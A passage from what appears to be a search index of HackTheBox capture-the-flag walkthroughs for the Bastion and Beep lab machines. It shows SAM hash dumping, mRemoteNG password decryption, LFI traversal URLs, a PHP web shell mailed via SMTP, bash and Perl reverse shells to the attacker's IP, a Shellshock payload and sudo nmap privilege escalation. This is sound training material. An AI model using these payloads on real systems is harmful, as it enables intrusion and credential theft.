Id=\"500e7d58-662a-44d4-aff0-3a4f547a3fee\" Username=\"Administrator\" Domain=\"\" Password=\"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==\" Hostname=\"127.0.0.1\" Protocol=\"RDP\" PuttySession=\"Default Settings\" Port=\"3389\" <snip> Using mremoteng_decrypt.py to crack the hash and got the Password: thXLHM96BeKL0ER2 . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:29.5]~/walkthrough/hackthebox/bastion \u2514\u2500$ python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw== Password: thXLHM96BeKL0ER2 SSH to server with Administrator Credential and own the system. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:29.5]~/walkthrough/hackthebox/bastion \u2514\u2500$ ssh administrator@10.10.10.134 administrator@10.10.10.134's password: Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. administrator@BASTION C:\\Users\\Administrator>whoami bastion\\administrator","title":"HTB Bastion"},{"location":"walkthrough/hackthebox/Bastion/index.html#hackthebox-bastion","text":"Author: Hades Scripting here","title":"HackTheBox Bastion"},{"location":"walkthrough/hackthebox/Bastion/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Bastion/index.html#openning-services","text":"### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.134 [+] Openning ports: 22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.134 -p22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-06 14:30 +07 Nmap scan report for 10.10.10.134 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -38m12s, deviation: 1h09m16s, median: 1m46s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Bastion | NetBIOS computer name: BASTION\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2021-04-06T09:33:24+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2021-04-06T07:33:28 |_ start_date: 2021-04-06T07:31:02 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 74.21 seconds","title":"Openning Services"},{"location":"walkthrough/hackthebox/Bastion/index.html#server-message-block","text":"Enum service SMB with smbmap , I saw there is Backups folder can access by guest. ### SMB Enumeration (445) ############################ smbmap -H 10.10.10.134 -u guest [+] IP: 10.10.10.134:445 Name: 10.10.10.134 [\\] Work[!] Unable to remove test directory at \\\\10.10.10.134\\Backups\\THPQBWRNVY, please remove manually Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin Backups READ, WRITE C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC Go to Backups folder using smbclient . This folder contain note file and windows image backup folder. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.0:12.6]~ \u2514\u2500$ smbclient //10.10.10.134/Backups Enter WORKGROUP\\kali's password: Try \"help\" to get a list of possible commands. smb: \\> ls . D 0 Wed Apr 7 14:48:08 2021 .. D 0 Wed Apr 7 14:48:08 2021 note.txt AR 116 Tue Apr 16 17:10:09 2019 QYJORCBZDG D 0 Wed Apr 7 14:48:08 2021 SDT65CB.tmp A 0 Fri Feb 22 19:43:08 2019 WindowsImageBackup Dn 0 Fri Feb 22 19:44:02 2019 I got the note file to local machine to read it. smb: \\> get note.txt getting file \\note.txt of size 116 as note.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) File note.txt is a message from Sysadmins, may a user is transfering his entire backup file, and folder WindowsImageBackup is his backup. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.7:12.9]~/walkthrough/hackthebox/bastion \u2514\u2500$ cat note.txt Sysadmins: please don't transfer the entire backup file locally, the VPN to the subsidiary office is too slow. Go to folder WindowsImageBackup and I saw file vhd which is Virtual Hard Disk of Windows machines. smb: \\WindowsImageBackup\\L4mpje-PC\\Backup 2019-02-22 124351\\> ls . Dn 0 Fri Feb 22 19:45:32 2019 .. Dn 0 Fri Feb 22 19:45:32 2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd An 37761024 Fri Feb 22 19:44:03 2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd An 5418299392 Fri Feb 22 19:45:32 2019 <snip>","title":"Server Message Block"},{"location":"walkthrough/hackthebox/Bastion/index.html#foothold","text":"","title":"Foothold"},{"location":"walkthrough/hackthebox/Bastion/index.html#crack-windows-credential","text":"Poc code here Because file .vhd is too large, download this file is not a good idea, I decided to mount this file as an image. Fisrt, mount folder Backups to /mnt/Backups folder in local machine. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.6:13.2]~/walkthrough/hackthebox/bastion \u2514\u2500$ sudo mount -t cifs //10.10.10.134/Backups /mnt -o user=guest,password= Using guestmount to mount file .vhd . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.6:13.2]~/walkthrough/hackthebox \u2514\u2500$ sudo guestmount -a /mnt/Backups/WindowsImageBackup/L4mpje-PC/Backup\\ 2019-02-22\\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i --ro /mnt/vhd Go to folder /mnt/vhd , It showed folder of Windows machine. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.8:28.2]/mnt \u2514\u2500$ sudo ls /mnt/vhd '$Recycle.Bin' config.sys pagefile.sys ProgramData Recovery Users autoexec.bat 'Documents and Settings' PerfLogs 'Program Files' 'System Volume Information' Windows I go to folder contain file SAM and file SYSTEM at /Windows/System32/config to copy it and dump credentials. \u250c\u2500\u2500(root\ud83d\udc80kali)-[/mnt] \u2514\u2500# cd vhd/Windows/System32/config \u250c\u2500\u2500(root\ud83d\udc80kali)-[/mnt/vhd/Windows/System32/config] \u2514\u2500# ls -l SAM SYSTEM -rwxrwxrwx 1 root root 262144 Feb 22 2019 SAM -rwxrwxrwx 1 root root 9699328 Feb 22 2019 SYSTEM Using samdump2 dump credentials of user in the system and save the hash to file. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:28.9]~/walkthrough/hackthebox/bastion \u2514\u2500$ samdump2 SYSTEM SAM *disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9::: \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:28.9]~/walkthrough/hackthebox/bastion \u2514\u2500$ samdump2 SYSTEM SAM > hash Using john with format NT and rockyou.txt directory to crack file hash. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:29.0]~/walkthrough/hackthebox/bastion \u2514\u2500$ john --format=NT --wordlist=/home/kali/directory/rockyou.txt hash <snip> bureaulampje (L4mpje) <snip> Session completed Password creacked, I got the password: bureaulampje . Based on the info gathering, the system openning port 22, allow ssh to server. Let's using cracked credential and access to Bastion. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:29.0]~/walkthrough/hackthebox/bastion \u2514\u2500$ ssh L4mpje@10.10.10.134 L4mpje@10.10.10.134's password: <snip> Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. l4mpje@BASTION C:\\Users\\L4mpje>whoami bastion\\l4mpje","title":"Crack Windows Credential"},{"location":"walkthrough/hackthebox/Bastion/index.html#privilege-escalation","text":"","title":"Privilege Escalation"},{"location":"walkthrough/hackthebox/Bastion/index.html#crack-mremoteng-creadential","text":"Poc code here After enum program installed in the server, I saw folder mRemoteNG in Program Files (x86). l4mpje@BASTION C:\\Program Files (x86)>dir Volume in drive C has no label. Volume Serial Number is 0CB3-C487 Directory of C:\\Program Files (x86) <snip> 22-02-2019 15:01 <DIR> mRemoteNG <snip> 0 File(s) 0 bytes 14 Dir(s) 11.296.088.064 bytes free Try to search public exploit for mRemoteNG, I saw a python script to decrypt passwords stored by mRemoteNG Searching password stored location, I have the result is file confCons.xml . Using dir /s search location of file confCons.xml in the server. This file in the directory C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG . l4mpje@BASTION C:\\Users>dir /s /d confCons.xml <snip> Directory of C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG confCons.xml <snip> Read file confCons.xml and I have the encrypted Administrator's password. l4mpje@BASTION C:\\Users>type C:\\Users\\L4mpje\\AppData\\Roaming\\mRemoteNG\\confCons.xml <snip> <Node Name=\"DC\" Type=\"Connection\" Descr=\"\" Icon=\"mRemoteNG\" Panel=\"General\" Id=\"500e7d58-662a-44d4-aff0-3a4f547a3fee\" Username=\"Administrator\" Domain=\"\" Password=\"aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==\" Hostname=\"127.0.0.1\" Protocol=\"RDP\" PuttySession=\"Default Settings\" Port=\"3389\" <snip> Using mremoteng_decrypt.py to crack the hash and got the Password: thXLHM96BeKL0ER2 . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:29.5]~/walkthrough/hackthebox/bastion \u2514\u2500$ python mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw== Password: thXLHM96BeKL0ER2 SSH to server with Administrator Credential and own the system. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[0.9:29.5]~/walkthrough/hackthebox/bastion \u2514\u2500$ ssh administrator@10.10.10.134 administrator@10.10.10.134's password: Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. administrator@BASTION C:\\Users\\Administrator>whoami bastion\\administrator","title":"Crack mRemoteNG Creadential"},{"location":"walkthrough/hackthebox/Beep/index.html","text":"HackTheBox Beep Author: Hades Scripting here Information Gathering Openning Services \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.3:28.8]~/scripting \u2514\u2500$ sudo ./enum/all.sh 10.10.10.7 [sudo] password for kali: ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.7 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.7 -p22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 10:40 +07 Nmap scan report for 10.10.10.7 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA) |_ 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA) 25/tcp open smtp Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 80/tcp open http Apache httpd 2.2.3 |_http-server-header: Apache/2.2.3 (CentOS) |_http-title: Did not follow redirect to https://10.10.10.7/ 110/tcp open pop3 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_pop3-capabilities: UIDL RESP-CODES EXPIRE(NEVER) STLS IMPLEMENTATION(Cyrus POP3 server v2) TOP AUTH-RESP-CODE LOGIN-DELAY(0) USER APOP PIPELINING 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 875/udp status |_ 100024 1 878/tcp status 143/tcp open imap Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_imap-capabilities: IMAP4rev1 Completed RENAME THREAD=REFERENCES ID MAILBOX-REFERRALS URLAUTHA0001 X-NETSCAPE CATENATE LIST-SUBSCRIBED LISTEXT QUOTA NAMESPACE IDLE CONDSTORE ATOMIC ACL ANNOTATEMORE BINARY MULTIAPPEND LITERAL+ OK SORT NO THREAD=ORDEREDSUBJECT RIGHTS=kxte SORT=MODSEQ UNSELECT CHILDREN STARTTLS UIDPLUS IMAP4 443/tcp open ssl/https? | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2017-04-07T08:22:08 |_Not valid after: 2018-04-07T08:22:08 |_ssl-date: 2021-04-02T03:57:36+00:00; +13m59s from scanner time. 878/tcp open status 1 (RPC #100024) 993/tcp open ssl/imap Cyrus imapd |_imap-capabilities: CAPABILITY 995/tcp open pop3 Cyrus pop3d 3306/tcp open mysql MySQL (unauthorized) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) 4190/tcp open sieve Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap) 4445/tcp open upnotifyp? 4559/tcp open hylafax HylaFAX 4.3.10 5038/tcp open asterisk Asterisk Call Manager 1.1 10000/tcp open http MiniServ 1.570 (Webmin httpd) |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1). Service Info: Hosts: beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix Host script results: |_clock-skew: 13m58s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 400.58 seconds Postfix smtpd Using nmap scan smtp service with nse script. ### SMTP Enumeration (25) ############################ nmap 10.10.10.7 -p25 -Pn --script=smtp-* <snip> PORT STATE SERVICE 25/tcp open smtp |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, | smtp-enum-users: |_ Method RCPT returned a unhandled status code. |_smtp-open-relay: Server doesn't seem to be an open relay, all tests failed | smtp-vuln-cve2010-4344: |_ The SMTP server is not Exim: NOT VULNERABLE Nmap done: 1 IP address (1 host up) scanned in 41.72 seconds Access to SMTP service and try to sent a email. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:27.1]~/walkthrough/hackthebox/beep \u2514\u2500$ nc -nC 10.10.10.7 25 220 beep.localdomain ESMTP Postfix mail from: \"hades\" 250 2.1.0 Ok rcpt to: \"root\" 250 2.1.5 Ok data 354 End data with <CR><LF>.<CR><LF> leecybersec . 250 2.0.0 Ok: queued as 25368D92FD Apache/2.2.3 (CentOS) At port 80, using gobuster to get a list of hidden in the web port. Should try more wordlist files if the results is not interesting. ### Web Enumeration (443) ############################ [+] Files and directories gobuster dir -k -u https://10.10.10.7:443 -w /usr/share/seclists/Discovery/Web-Content/common.txt <snip> =============================================================== /.hta (Status: 403) [Size: 282] /.htaccess (Status: 403) [Size: 287] /.htpasswd (Status: 403) [Size: 287] /admin (Status: 301) [Size: 309] [--> https://10.10.10.7/admin/] /cgi-bin/ (Status: 403) [Size: 286] /configs (Status: 301) [Size: 311] [--> https://10.10.10.7/configs/] /favicon.ico (Status: 200) [Size: 894] /help (Status: 301) [Size: 308] [--> https://10.10.10.7/help/] /images (Status: 301) [Size: 310] [--> https://10.10.10.7/images/] /index.php (Status: 200) [Size: 1785] /lang (Status: 301) [Size: 308] [--> https://10.10.10.7/lang/] /libs (Status: 301) [Size: 308] [--> https://10.10.10.7/libs/] /mail (Status: 301) [Size: 308] [--> https://10.10.10.7/mail/] /modules (Status: 301) [Size: 311] [--> https://10.10.10.7/modules/] /panel (Status: 301) [Size: 309] [--> https://10.10.10.7/panel/] /robots.txt (Status: 200) [Size: 28] /static (Status: 301) [Size: 310] [--> https://10.10.10.7/static/] /themes (Status: 301) [Size: 310] [--> https://10.10.10.7/themes/] /var (Status: 301) [Size: 307] [--> https://10.10.10.7/var/] <snip> Elastix At the url https://10.10.10.7 I saw a Elastix web application. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:26.8]~/walkthrough/hackthebox/beep \u2514\u2500$ searchsploit elastix ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- <snip> Elastix 2.2.0 - 'graph.php' Local File Inclusion | php/webapps/37637.pl Elastix 2.x - Blind SQL Injection | php/webapps/36305.txt Elastix < 2.5 - PHP Code Injection | php/webapps/38091.php FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execut | php/webapps/18650.py ---------------------------------------------------- --------------------------------- Shellcodes: No Results FreePBX 2.8.1.4 Follow the uri /admin , this is FreePBX web application. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:28.6]~/walkthrough/hackthebox/beep \u2514\u2500$ searchsploit FreePBX 2.8.1.4 ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- FreePBX < 13.0.188 - Remote Command Execution (Meta | php/remote/40434.rb Freepbx < 2.11.1.5 - Remote Code Execution | php/webapps/41005.txt ---------------------------------------------------- --------------------------------- Shellcodes: No Results RoundCube Webmail Follow the uri /mail , this is RoundCube Webmail web application. vtiger CRM 5.1.0 At the exploit 37637.pl , I saw in the payload contain url vtigercrm . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:31.0]~/scripting \u2514\u2500$ searchsploit vtiger CRM 5.1.0 ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- vTiger CRM 5.1.0 - Local File Inclusion | php/webapps/18770.txt ---------------------------------------------------- --------------------------------- Shellcodes: No Results MiniServ 1.570 Webmin application is running on port 10000. After try to login with some default username/password, the web app redirect to login page with uri /session_login.cgi \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.9:29.5]~/walkthrough/hackthebox/beep \u2514\u2500$ searchsploit Webmin cgi ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- <snip> Webmin 1.5 - Web Brute Force (CGI) | multiple/remote/745.pl Webmin 1.580 - '/file/show.cgi' Remote Command Exec | unix/remote/21851.rb Webmin 1.850 - Multiple Vulnerabilities | cgi/webapps/42989.txt Webmin 1.900 - Remote Command Execution (Metasploit | cgi/remote/46201.rb Webmin 1.x - HTML Email Command Execution | cgi/webapps/24574.txt Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (M | linux/webapps/47330.rb ---------------------------------------------------- --------------------------------- Shellcodes: No Results Foothold LFI leaked Credential At exploit php/webapps/37637.pl , I saw the LFI Exploit showing the amportal.conf contain password jEhdIekWmdjE . This password have been used to any account listed in file. view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../../../../..//etc/amportal.conf%00&module=Accounts&action <snip> AMPDBPASS=jEhdIekWmdjE AMPMGRPASS=jEhdIekWmdjE FOPPASSWORD=jEhdIekWmdjE ARI_ADMIN_PASSWORD=jEhdIekWmdjE Make a guess, I try this password with root's ssh credential. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.1:30.7]~/walkthrough/hackthebox/beep \u2514\u2500$ ssh root@10.10.10.7 root@10.10.10.7's password: Last login: Fri Apr 2 10:27:42 2021 from 10.10.14.5 Welcome to Elastix ---------------------------------------------------- To access your Elastix System, using a separate workstation (PC/MAC/Linux) Open the Internet Browser using the following URL: http://10.10.10.7 [root@beep ~]# id uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) [root@beep ~]# LFI and Postfix smtpd Poc code here After gathering information in the server, I have 2 LFI vulnerabilities: Elastix 2.2.0 - 'graph.php' Local File Inclusion vTiger CRM 5.1.0 - Local File Inclusion Get the user account in the server. view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../../../../..//etc/passwd%00&module=Accounts&action view-source:https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00&cmd=id I grep only user can execute shell root:x:0:0:root:/root:/bin/bash mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash spamfilter:x:500:500::/home/spamfilter:/bin/bash fanis:x:501:501::/home/fanis:/bin/bash To create a backdoor, go first with SMTP service. I access to it and sent a mail contain php backdoor code to user asterisk . \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.1:32.9]~/walkthrough/hackthebox/beep \u2514\u2500$ nc -nC 10.10.10.7 25 220 beep.localdomain ESMTP Postfix vrfy asterisk@localhost 252 2.0.0 asterisk@localhost mail from: \"hades <?php system($_GET['cmd']); ?> hades\" 250 2.1.0 Ok rcpt to: \"asterisk\" 250 2.1.5 Ok data 354 End data with <CR><LF>.<CR><LF> . 250 2.0.0 Ok: queued as A3254D92FD quit 221 2.0.0 Bye After sent a mail, I using LFI go to asterisk's mail file at /var/mail/asterisk Get reverse shell Url encode using hURL to encode payload. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.1:30.7]~/walkthrough/hackthebox/beep \u2514\u2500$ hURL -U \"bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'\" Original :: bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1' URL ENcoded :: bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27 Execute bash reverse shell. view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../../../../..//var/mail/asterisk%00&module=Accounts&action&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27 view-source:https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../..//var/mail/asterisk%00&cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.5%2F443%200%3E%261%27 Listener in Kali machine \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.1:30.6]~/walkthrough/hackthebox/beep \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.7] 53748 bash: no job control in this shell bash-3.2$ id uid=100(asterisk) gid=101(asterisk) groups=101(asterisk) bash-3.2$ VoIP Command Injection Poc code here I used exploit php/webapps/18650.py found when I enum Elastix. Detect VoIP system using svmap \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.1:20.3]~/walkthrough/hackthebox/beep \u2514\u2500$ svmap 10.10.10.7 +-----------------+---------------------+-------------+ | SIP Device | User Agent | Fingerprint | +=================+=====================+=============+ | 10.10.10.7:5060 | FPBX-2.8.1(1.8.7.0) | disabled | +-----------------+---------------------+-------------+ Find the extension in the server with svwar -m method REGISTER (default), OPTIONS and INVITE -e RANGE There are an authentication when I use method REGISTER, I also have no OPTIONS, I use INVITE to call in the chanel with range of extension 100-300. \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.3:20.3]~/walkthrough/hackthebox/beep \u2514\u2500$ svwar -m INVITE -e100-300 10.10.10.7 <snip> +-----------+----------------+ | Extension | Authentication | +===========+================+ | 233 | reqauth | +-----------+----------------+ | 229 | weird | +-----------+----------------+ In the exploit the extension=\"233\", I was drop some sys.argv and query the url with firefox. IppSec HackTheBox Beep \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[1.5:21.3]~/walkthrough/hackthebox/beep \u2514\u2500$ python3 18650.py 233 10.10.10.7 10.10.14.5 443 https://10.10.10.7/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.14.5%3a443%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A Listener in Kali machine \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.2:50.6]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.7] 47806 id uid=100(asterisk) gid=101(asterisk) python -c \"import pty;pty.spawn('/bin/bash')\" bash-3.2$ Webmin Shellshock Poc code here Webmin using session_login.cgi , it can be exploit using shellshock payload. Payload: User-Agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1' Listener in Kali machine \u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.1:30.8]~ \u2514\u2500$ sudo nc -nvlp 443 listening on [any] 443 ... connect to [10.10.14.5] from (UNKNOWN) [10.10.10.7] 40293 bash: no job control in this shell [root@beep webmin]# id uid=0(root) gid=0(root) [root@beep webmin]# Privilege Escalation Nmap SUID Back to shell at LFI and Postfix smtpd , I enumed server with linpeas.sh bash-3.2$ sudo -l <snip> User asterisk may run the following commands on this host: (root) NOPASSWD: /sbin/shutdown (root) NOPASSWD: /usr/bin/nmap (root) NOPASSWD: /usr/bin/yum (root) NOPASSWD: /bin/touch (root) NOPASSWD: /bin/chmod (root) NOPASSWD: /bin/chown (root) NOPASSWD: /sbin/service (root) NOPASSWD: /sbin/init (root) NOPASSWD: /usr/sbin/postmap (root) NOPASSWD: /usr/sbin/postfix (root) NOPASSWD: /usr/sbin/saslpasswd2 (root) NOPASSWD: /usr/sbin/hardware_detector (root) NOPASSWD: /sbin/chkconfig (root) NOPASSWD: /usr/sbin/elastix-helper GTFOBins bash-3.2$ sudo /usr/bin/nmap --interactive Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h <enter> for help nmap> !sh sh-3.2# whoami root sh-3.2#","title":"HTB Beep"},{"location":"walkthrough/hackthebox/Beep/index.html#hackthebox-beep","text":"Author: Hades Scripting here","title":"HackTheBox Beep"},{"location":"walkthrough/hackthebox/Beep/index.html#information-gathering","text":"","title":"Information Gathering"},{"location":"walkthrough/hackthebox/Beep/index.html#openning-services","text":"\u250c\u2500\u2500(Hades\u327f10.10.14.5)-[2.3:28.8]~/scripting \u2514\u2500$ sudo ./enum/all.sh 10.10.10.7 [sudo] password for kali: ### Port Scanning ############################ nmap -sS -p- --min-rate 1000 10.10.10.7 | grep ^[0-9] | cut -d '/' -f1 | tr '\\n' ',' | sed s/,$// [+] Openning ports: 22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 ### Services Enumeration ############################ nmap -sC -sV -Pn 10.10.10.7 -p22,25,80,110,111,143,443,878,993,995,3306,4190,4445,4559,5038,10000 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-02 10:40 +07 Nmap scan report for 10.10.10.7 Host is up (0.25s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA) |_ 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA) 25/tcp open smtp Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 80/tcp open http Apache httpd 2.2.3 |_http-server-header: Apache/2.2.3 (CentOS) |_http-title: Did not follow redirect to https://10.10.10.7/ 110/tcp open pop3 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_pop3-capabilities: UIDL RESP-CODES EXPIRE(NEVER) STLS 